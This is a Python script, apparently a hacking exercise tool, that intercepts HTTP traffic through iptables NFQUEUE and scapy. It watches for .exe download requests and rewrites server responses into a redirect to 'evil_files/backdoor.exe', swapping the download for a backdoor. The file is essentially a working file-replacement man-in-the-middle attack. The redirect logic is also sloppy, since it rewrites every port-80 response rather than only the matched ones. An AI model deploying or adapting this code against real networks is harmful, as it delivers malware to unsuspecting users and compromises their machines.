#!/usr/bin/env python
from logging import getLogger, ERROR
getLogger('scapy.runtime').setLevel(ERROR)
import scapy.all as scapy
import netfilterqueue
import subprocess
import argparse
from colorama import init, Fore		# for fancy/colorful display

class File_Interceptor:
    def __init__(self):
        # initialize colorama
        init()
        # define colors
        self.GREEN = Fore.GREEN
        self.RED = Fore.RED
        self.Cyan = Fore.CYAN
        self.RESET = Fore.RESET
        self.Yellow = Fore.YELLOW
        self.Blue = Fore.BLUE
        self.ack_list = []          # TCP_ACK List

    def arguments(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('--queue-num ', dest='queue', help='Specify The Queue Number')
        value = parser.parse_args()
        if not value.queue:
            parser.error('\n{}[-] Please Specify The Queue Number {}'.format(self.RED, self.RESET))
        return value

    def get_load(self, packet, load):
        packet[scapy.Raw].load = load
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet

    def request(self, packet):
        print('\n{}[+] HTTP Request{}'.format(self.GREEN, self.RESET))
        if str.encode('.exe') in packet[scapy.Raw].load:  # same goes for other file extensions
            print('\n{}[+] EXE Request{}'.format(self.RED, self.RESET))
            self.ack_list.append(packet[scapy.TCP].ack)

    def response(self, packet):
        print('\n{}[+] HTTP Response{}'.format(self.Blue, self.RESET))
        if packet[scapy.TCP].seq in self.ack_list:
            print('\n[+] Replacing EXE ')
            self.ack_list.remove(packet[scapy.TCP].seq)

    def process_packets(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        # with Raw layer, modifying of data (requsests & responses) is easy instead of having HTTP layer
        if scapy_packet.haslayer(scapy.Raw):    # display Raw data (load field)
            if scapy_packet[scapy.TCP].dport == 80:
                self.request(scapy_packet)   #function call

            elif scapy_packet[scapy.TCP].sport == 80:
                self.response(scapy_packet)  #function call
                redirect_url = 'HTTP/1.1 301 Moved Permanently\nLocation: http://localhost/evil_files/backdoor.exe\n\n'
                modified_packet = self.get_load(scapy_packet, redirect_url)

                packet.set_payload(str(modified_packet))   #set_payload expect a string argument

        packet.accept()

    def start(self):
        try:
            option = self.arguments()
            subprocess.call(['clear'])

            print('{}\n\n\t\t\t\t\t#########################################################{}'.format(self.Cyan, self.RESET))
            print('\n{}\t\t\t\t\t#\t\t  Intercept HTTP Traffic\t\t#\n{}'.format(self.Cyan, self.RESET))
            print('{}\t\t\t\t\t#########################################################{}\n\n'.format(self.Cyan, self.RESET))

            print('\n\n{}[+] Enables IP Tables...{}\n'.format(self.Yellow, self.RESET))
            subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num {}'.format(option.queue), shell=True)
            subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num {}'.format(option.queue), shell=True)
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(int(option.queue), self.process_packets)
            queue.run()
        except KeyboardInterrupt:
            print('\n{}[*] Flush IP Tables...{}'.format(self.Yellow, self.RESET))
            subprocess.call('iptables --flush ', shell=True)

if __name__ == "__main__":
    file = File_Interceptor()
    file.start()
